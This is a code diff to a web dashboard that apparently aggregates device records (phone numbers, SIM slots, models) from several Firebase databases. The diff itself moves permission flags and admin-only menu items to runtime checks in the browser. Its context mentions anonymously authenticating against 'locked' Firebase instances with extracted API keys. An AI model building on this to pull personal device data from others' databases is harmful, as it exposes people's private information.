@@ -1203,7 +1203,6 @@ if (inviteCode) {
                 if (filterMain) filterMain.style.display = 'none';
                 if (filterBulk) filterBulk.style.display = 'none';
                 
-                renderDbSidebarFilters();
                 fetchAll();
                 customAlert('Invite Accepted', `Securely connected to <b>${label}</b>. This is a temporary session — it will not be saved to your vault.`);
             }, 0);
@@ -1308,7 +1307,6 @@ async function bootNexus() {
             if (fEditBulk) fEditBulk.style.display = 'none';
         }
 
-        renderDbSidebarFilters();
         await fetchAll();
         
         document.getElementById('loader').classList.add('hidden');
@@ -1352,7 +1350,6 @@ function renderDbSidebarFilters() {
 
 let devices = [], filtered = [], selDev = null, cache = {};
 let fStat = 'all', fSrc = 'all', fEdit = 'all', curTab = 'overview', selSim = 1, mf = 'all';
-let CAN_EDIT_PHONE = false;
 const _authTokenCache = {};
 
 // Anonymously authenticate against a locked Firebase using its Web API Key
@@ -1499,6 +1496,7 @@ async function fetchAll(isBg = false) {
     if (!isBg) {
         devices = newDevices;
         devices.sort((a,b) => (b.status?1:0) - (a.status?1:0));
+        renderDbSidebarFilters();
         updateStats();
         filterDevs();
         renderTab();
@@ -1664,9 +1662,9 @@ function renderDevList() {
                 <div class="d-id">${esc(d._id)}</div>
                 <div class="d-sub">
                     <span id="ph-${d._id}">${esc(ph)}</span>
-                    ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
+                    ${(window.CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:14px;height:14px;background:var(--cyan);color:#000;border-radius:3px;font-size:0.65rem;margin-left:4px;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
                     ${ph !== 'Unknown' ? `<button class="d-copy" onclick="event.stopPropagation();copyToClip('${ph}', this)" title="Copy Number">📋</button>` : ''}
-                    ${CAN_EDIT_PHONE ? `<button class="d-edit list-edit-btn" onclick="event.stopPropagation();editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
+                    ${window.CAN_EDIT_PHONE ? `<button class="d-edit list-edit-btn" onclick="event.stopPropagation();editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
                 </div>
             </div>
             <div class="d-meta">
@@ -1809,8 +1807,8 @@ function renderTab(silent = false) {
                     <div class="detail-row"><span class="d-key">Phone No.</span>
                         <span class="d-val v-cyan" style="display:flex;align-items:center;gap:8px">
                             ${esc(d.customPh || d.mobNo || 'Unknown')}
-                            ${(CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
-                            ${CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
+                            ${(window.CAN_EDIT_PHONE && d.customPh) ? '<span style="display:inline-flex;align-items:center;justify-content:center;width:16px;height:16px;background:var(--cyan);color:#000;border-radius:4px;font-size:0.75rem;cursor:help;font-weight:900;" title="Manually Edited">M</span>' : ''}
+                            ${window.CAN_EDIT_PHONE ? `<button class="d-edit" style="opacity:1;position:relative" onclick="editPhone('${d._src}','${d._id}')" title="Edit Number">✏️</button>` : ''}
                         </span>
                     </div>
                     <div class="detail-row"><span class="d-key">Model</span><span class="d-val">${esc(d.modelName)}</span></div>
@@ -2332,7 +2330,7 @@ function customConfirm(title, desc, callback) {
 function closeConfirm() { document.getElementById('confirmModal').classList.remove('active'); }
 
 async function editPhone(src, id) {
-    if(!CAN_EDIT_PHONE) return customAlert('Access Denied', 'You do not have permission to edit numbers.');
+    if(!window.CAN_EDIT_PHONE) return customAlert('Access Denied', 'You do not have permission to edit numbers.');
     const d = devices.find(x => x._id === id && x._src === src);
     if(!d) return;
     
@@ -3234,6 +3232,9 @@ function showContextMenu(e, src, id) {
     let x = e.clientX;
     let y = e.clientY;
     
+    const cu = document.getElementById('ctxCopyUrl');
+    if (cu) cu.style.display = window.CURRENT_ROLE === 'admin' ? 'block' : 'none';
+
     menu.style.display = 'block';
     const rw = menu.offsetWidth;
     const rh = menu.offsetHeight;
@@ -3279,6 +3280,10 @@ function showHubContextMenu(e, src) {
     ctxHub = src;
     const menu = document.getElementById('hubContextMenu');
     let x = e.clientX; let y = e.clientY;
+
+    const hcu = document.getElementById('ctxHubCopyUrl');
+    if (hcu) hcu.style.display = window.CURRENT_ROLE === 'admin' ? 'block' : 'none';
+
     menu.style.display = 'block';
     const rw = menu.offsetWidth; const rh = menu.offsetHeight;
     if (x + rw > window.innerWidth) x = window.innerWidth - rw - 10;
@@ -3504,12 +3509,12 @@ async function extractFirebaseConfig(file) {
     <div id="contextMenu" class="context-menu">
         <div class="c-header">Device Actions</div>
         <div class="c-item" onclick="execContext('copy-id', this)">📋 Copy Device ID</div>
-        ${window.CURRENT_ROLE === 'admin' ? '<div class="c-item" onclick="execContext(\'copy-url\', this)">🔗 Copy Database URL</div>' : ''}
+        <div class="c-item" id="ctxCopyUrl" onclick="execContext('copy-url', this)">🔗 Copy Database URL</div>
     </div>
     
     <div id="hubContextMenu" class="context-menu">
         <div class="c-header">Database Actions</div>
-        ${window.CURRENT_ROLE === 'admin' ? '<div class="c-item" onclick="execHubContext(\'copy-url\', this)">🔗 Copy Database URL</div>' : ''}
+        <div class="c-item" id="ctxHubCopyUrl" onclick="execHubContext('copy-url', this)">🔗 Copy Database URL</div>
     </div>
 </body>
 </html>
